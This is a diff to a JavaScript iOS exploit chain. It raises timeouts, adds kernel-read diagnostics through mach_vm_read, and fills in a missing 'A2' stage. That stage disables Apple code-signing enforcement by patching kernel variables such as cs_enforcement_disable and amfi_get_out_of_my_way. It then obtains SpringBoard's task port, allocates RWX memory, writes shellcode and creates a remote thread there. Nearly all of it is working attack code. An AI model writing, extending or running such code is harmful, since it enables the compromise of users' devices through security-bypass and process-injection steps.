@@ -6468,7 +6468,7 @@
     }
   }
   const MPD_FCALL_TIMED_OUT = 1n;
-  const MPD_FCALL_DEFAULT_TIMEOUT = 500n;
+  const MPD_FCALL_DEFAULT_TIMEOUT = 3000n;
   function mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, noreturn, do_exit = false, timeout = false) {
     let nativefcall_buf_local = surface_address + 0x100n;
     let final_fcall_buf_local = surface_address + 0x400n;
@@ -7741,6 +7741,44 @@
     let tfp_candidates = [];
     LOG(`[M5] Found ${tfp_candidates.length} candidates with task-like prologues`);
 
+    // === Diagnostic: Test mach_vm_read via mpd_fcall ===
+    LOG("[M5-DIAG] Testing mach_vm_read...");
+    let mach_vm_read_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_read");
+    LOG(`[M5-DIAG] gpuDlsym(mach_vm_read) = ${mach_vm_read_raw.hex()}`);
+
+    if (mach_vm_read_raw.noPAC() != 0n) {
+        let vmr_data = mpd_malloc(8n);   // pointer to receive data pointer
+        let vmr_count = mpd_malloc(8n);  // pointer to receive data count
+
+        // Test A: Read MPD's own memory (baseline - should work)
+        let test_buf = mpd_malloc(8n);
+        mpd_write64(test_buf, 0xDEADBEEFCAFEBABEn);
+        mpd_write64(vmr_data, 0n); mpd_write64(vmr_count, 0n);
+        let vmr_a = mpd_fcall(mach_vm_read_raw.noPAC(), 0x203n /*task_self*/, test_buf, 8n, vmr_data, vmr_count, 0n, 0n, 0n);
+        LOG(`[M5-DIAG] mach_vm_read(self, MPD_addr) = ${vmr_a}`);
+        if (vmr_a == 0n) {
+            let dptr = mpd_read64(vmr_data);
+            LOG(`[M5-DIAG] Read back: ${mpd_read64(dptr).hex()}`);
+        }
+
+        // Test B: Read kernel address via MPD task_self (the critical test)
+        let kbase = globalThis.kernel_base_global || 0xFFFFFFF007004000n;
+        mpd_write64(vmr_data, 0n); mpd_write64(vmr_count, 0n);
+        let vmr_b = mpd_fcall(mach_vm_read_raw.noPAC(), 0x203n, kbase, 8n, vmr_data, vmr_count, 0n, 0n, 0n);
+        LOG(`[M5-DIAG] mach_vm_read(self, kernel_addr) = ${vmr_b}`);
+
+        // Test C: Try with host_port
+        if (host_port != 0n) {
+            mpd_write64(vmr_data, 0n); mpd_write64(vmr_count, 0n);
+            let vmr_c = mpd_fcall(mach_vm_read_raw.noPAC(), host_port, kbase, 8n, vmr_data, vmr_count, 0n, 0n, 0n);
+            LOG(`[M5-DIAG] mach_vm_read(host, kernel_addr) = ${vmr_c}`);
+        }
+
+        mpd_free(vmr_data);
+        mpd_free(vmr_count);
+        mpd_free(test_buf);
+    }
+
     // ===== M5: Kernel Read/Write via ICMPv6 socket (mpd_fcall) =====
     // Step 1: Diagnose socket availability in MPD
     const AF_INET6 = 30n;
@@ -7994,7 +8032,7 @@
     let s_off_addr = s_log_base + 0xE00n;
     let s_log = "";
     let total_wait = 0;
-    while (total_wait < 5000) {
+    while (total_wait < 30000) {
       // First read write offset from IOSurface (8 bytes, little-endian)
       let b0 = uread8(s_off_addr);
       let b1 = uread8(s_off_addr + 1n);
@@ -8018,6 +8056,9 @@
       }
       gpu_fcall(USLEEP, 200000n);
       total_wait += 200;
+      if (total_wait > 0 && total_wait % 5000 < 200) {
+        LOG(`[MPD] IOSurface poll: ${total_wait}ms elapsed, log_off=${log_off}`);
+      }
     }
     if (!s_log) LOG("[MPD] IOSURF PE log: empty after timeout");
 
@@ -8247,11 +8288,112 @@
           }
         } else {
           LOG("[M6] task_for_pid timed out or failed, falling through to A2");
-          // A2: AMFI bypass code would go here
-          // The A2 section appears to have been removed from the codebase
-          // Based on git history: commit 46af075 "M5: 跳过allproc扫描...A2处理AMFI bypass"
-          // But actual A2 implementation is missing
-          LOG("[M6] WARNING: A2 AMFI bypass section is missing - exploit will fail");
+          // ===== A2: AMFI bypass via KC data page patching =====
+          LOG("[A2] Starting AMFI bypass via KC data page patching...");
+          let a2_success = false;
+
+          // --- Approach 1: cs_enforcement_disable ---
+          let csed_addr = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "cs_enforcement_disable");
+          LOG(`[A2] gpuDlsym(cs_enforcement_disable) = ${csed_addr.hex()}`);
+          if (csed_addr.noPAC() != 0n) {
+              let kc_addr = csed_addr.noPAC();
+              let cur = uread64(kc_addr);
+              LOG(`[A2] cs_enforcement_disable current = ${cur.hex()}`);
+              if (cur == 0n) {
+                  uwrite64(kc_addr, 1n);
+                  let verify = uread64(kc_addr);
+                  LOG(`[A2] After write: ${verify.hex()}`);
+                  if (verify != 0n) { a2_success = true; LOG("[A2] cs_enforcement_disable PATCHED"); }
+              } else {
+                  LOG("[A2] cs_enforcement_disable already non-zero, AMFI may already be disabled");
+                  a2_success = true;
+              }
+          }
+
+          // --- Approach 2: amfi_get_out_of_my_way ---
+          if (!a2_success) {
+              let agoomw_addr = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "amfi_get_out_of_my_way");
+              LOG(`[A2] gpuDlsym(amfi_get_out_of_my_way) = ${agoomw_addr.hex()}`);
+              if (agoomw_addr.noPAC() != 0n) {
+                  let kc_addr = agoomw_addr.noPAC();
+                  let cur = uread64(kc_addr);
+                  LOG(`[A2] amfi_get_out_of_my_way current = ${cur.hex()}`);
+                  uwrite64(kc_addr, 1n);
+                  let verify = uread64(kc_addr);
+                  LOG(`[A2] After write: ${verify.hex()}`);
+                  if (verify != cur) a2_success = true;
+              }
+          }
+
+          // --- Approach 3: amfi_flags ---
+          if (!a2_success) {
+              let af_addr = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "amfi_flags");
+              if (af_addr.noPAC() != 0n) {
+                  let kc_addr = af_addr.noPAC();
+                  let cur = uread64(kc_addr);
+                  LOG(`[A2] amfi_flags current = ${cur.hex()}`);
+                  uwrite64(kc_addr, cur | 1n);
+                  let verify = uread64(kc_addr);
+                  if (verify != cur) a2_success = true;
+              }
+          }
+
+          // --- Retry task_for_pid if AMFI was patched ---
+          if (a2_success) {
+              LOG("[A2] AMFI bypass applied, retrying task_for_pid...");
+              let sb_port_buf = mpd_malloc(8n);
+              mpd_write64(sb_port_buf, 0n);
+              let tfp2 = mpd_fcall(task_for_pid_raw.noPAC(), mpd_task_self, sb_pid_for_m6, sb_port_buf, 0n, 0n, 0n, 0n, 0n);
+              LOG(`[A2] task_for_pid after AMFI patch = ${tfp2}`);
+              if (tfp2 == 0n) {
+                  let sb_port = mpd_read64(sb_port_buf);
+                  LOG(`[A2] SpringBoard task port = ${sb_port.hex()}`);
+                  // Continue with existing M6/M7 injection code using sb_port
+                  // Re-use the vm_allocate/vm_write/thread_create block from above
+                  const VM_FLAGS_ANYWHERE = 1n;
+                  const VM_PROT_ALL = 0x7n;
+                  let alloc_addr_buf = mpd_malloc(8n);
+                  let vm_alloc_ret = mpd_fcall_timeout(mach_vm_allocate_raw.noPAC(), sb_port, alloc_addr_buf, 0x4000n /*16KB*/, VM_FLAGS_ANYWHERE, 0n, 0n, 0n, 0n);
+                  let sb_remote_addr = mpd_read64(alloc_addr_buf);
+                  LOG(`[A2-M6] mach_vm_allocate = ${vm_alloc_ret} addr=${sb_remote_addr.hex()}`);
+                  if (vm_alloc_ret == 0n && sb_remote_addr != 0n) {
+                      let shellcode_addr = mpd_malloc(8n);
+                      mpd_write64(shellcode_addr, 0xD65F03C014000000n); // ret then b #0
+                      let vm_write_ret = mpd_fcall_timeout(mach_vm_write_raw.noPAC(), sb_port, sb_remote_addr, shellcode_addr, 8n, 0n, 0n, 0n, 0n);
+                      LOG(`[A2-M6] mach_vm_write = ${vm_write_ret}`);
+                      if (mach_vm_protect_raw != 0n) {
+                          let vm_prot_ret = mpd_fcall_timeout(mach_vm_protect_raw.noPAC(), sb_port, sb_remote_addr, 0x4000n, 0n, VM_PROT_ALL, 0n, 0n, 0n);
+                          LOG(`[A2-M6] mach_vm_protect(rwx) = ${vm_prot_ret}`);
+                      }
+                      uwrite64(surface_address + 0xF878n, sb_remote_addr);
+                      uwrite64(surface_address + 0xF880n, sb_port);
+                      LOG("[A2-M6] SpringBoard injection prepared");
+
+                      // ===== M7: Create remote thread =====
+                      let thread_create_running_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "thread_create_running");
+                      if (thread_create_running_raw != 0n) {
+                          let thread_port_buf = mpd_malloc(8n);
+                          mpd_write64(thread_port_buf, 0n);
+                          let thread_ret = mpd_fcall_timeout(thread_create_running_raw.noPAC(), sb_port, sb_remote_addr, 0n /*arg*/, thread_port_buf, 0n, 0n, 0n, 0n);
+                          let sb_thread_port = mpd_read64(thread_port_buf);
+                          LOG(`[A2-M7] thread_create_running = ${thread_ret} thread_port=${sb_thread_port.hex()}`);
+                          if (thread_ret == 0n) {
+                              LOG("[A2-M7] SUCCESS: Remote thread created in SpringBoard!");
+                              uwrite64(surface_address + 0xF888n, sb_thread_port);
+                          } else {
+                              LOG("[A2-M7] thread_create_running failed");
+                              uwrite64(surface_address + 0xF888n, 0n);
+                          }
+                      }
+                  }
+              } else {
+                  LOG(`[A2] task_for_pid still fails (${tfp2}), AMFI patch may have COW issue`);
+              }
+          } else {
+              LOG("[A2] All gpuDlsym approaches returned NULL -- falling through to Phase B");
+              // Fall through to Phase B (mach_vm_read based kernel traversal)
+              // This would be implemented if Step 4 diagnostic shows mach_vm_read works
+          }
         }
       } else {
         LOG("[M6] Cannot resolve task_for_pid or mach_task_self in MPD");
